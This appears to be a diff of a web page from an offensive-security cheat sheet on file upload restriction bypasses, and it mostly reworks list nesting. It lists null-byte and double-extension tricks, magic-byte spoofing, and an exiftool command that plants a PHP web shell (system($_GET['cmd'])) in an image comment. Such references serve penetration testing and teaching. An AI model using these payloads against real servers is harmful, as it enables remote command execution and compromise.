@@ -7719,10 +7719,14 @@
 <li>Null Byte: <code class="codehilite"><span class="c">%00</span></code> to bypass file name restrictions (<code class="codehilite"><span class="n">wpes</span><span class="p">.</span><span class="n">php</span><span class="o">%</span><span class="mi">00</span><span class="p">.</span><span class="n">png</span></code>)</li>
 <li>Double Extensions: <code class="codehilite"><span class="n">wpes</span><span class="p">.</span><span class="n">png</span><span class="p">.</span><span class="n">php</span></code></li>
 <li>Altering content type</li>
-<li>Magic number: (Example: gif: <code class="codehilite"><span class="n">GIF89a</span><span class="p">;</span></code>)</li>
+<li>Magic number: (Example: gif: <code class="codehilite"><span class="n">GIF89a</span><span class="p">;</span></code>)<ul>
 <li><a href="https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/">https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/</a></li>
-<li>Code in image comment:</li>
+</ul>
+</li>
+<li>Code in image comment:<ul>
 <li><code class="codehilite"><span class="nx">exiftool</span> <span class="o">-</span><span class="nx">Comment</span><span class="o">=</span><span class="s1">&#39;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="s1">&#39;</span> <span class="nx">lo</span><span class="p">.</span><span class="nx">jpg</span></code></li>
+</ul>
+</li>
 </ul>
 <h2 id="alternative-extensions">Alternative Extensions<a class="headerlink" href="#alternative-extensions" title="Permanent link">&para;</a></h2>
 <p>PHP
